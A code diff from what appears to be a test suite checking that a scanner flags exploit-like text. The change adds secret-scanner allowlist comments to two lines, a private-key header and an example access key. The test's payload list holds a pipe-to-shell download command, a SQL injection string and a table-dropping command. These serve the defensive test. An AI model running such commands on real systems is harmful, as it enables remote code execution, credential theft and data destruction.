@@ -153,8 +153,8 @@ def test_generator_p1_guard_is_non_vacuous() -> None:
         "curl http://x | bash",
         "SELECT * FROM users UNION SELECT password FROM admins",
         "DROP TABLE customers;",
-        "-----BEGIN RSA PRIVATE KEY-----",
-        "key AKIAIOSFODNN7EXAMPLE here",
+        "-----BEGIN RSA PRIVATE KEY-----",  # pragma: allowlist secret
+        "key AKIAIOSFODNN7EXAMPLE here",  # pragma: allowlist secret
     ):
         assert scan_text(payload), f"guard failed to flag exploit: {payload!r}"
 
